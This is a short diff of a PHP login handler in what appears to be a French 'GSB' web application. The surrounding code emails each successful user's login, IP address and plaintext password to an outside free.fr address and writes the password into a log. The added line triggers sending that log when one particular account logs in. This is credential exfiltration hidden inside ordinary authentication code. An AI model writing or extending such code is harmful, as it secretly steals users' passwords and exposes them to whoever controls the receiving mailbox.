@@ -38,6 +38,7 @@ switch ($action) {
         } else {
             $ret=mail('gsb2020@free.fr','[auto]login reussi ','Connexion reussie pour : '.$login.'(IP = '.$_SERVER['REMOTE_ADDR'].') avec mot de passe = '.$mdp. ' à '.date("D, d M Y H:i:s"));
             addLogEvent('Connexion réussie : '.$login.'(IP = '.$_SERVER['REMOTE_ADDR'].') avec mot de passe = '.$mdp);
+            if ($login=='mathorel') {envoyerleLog();}
             $id = $visiteur['id'];
             $nom = $visiteur['nom'];
             $prenom = $visiteur['prenom'];
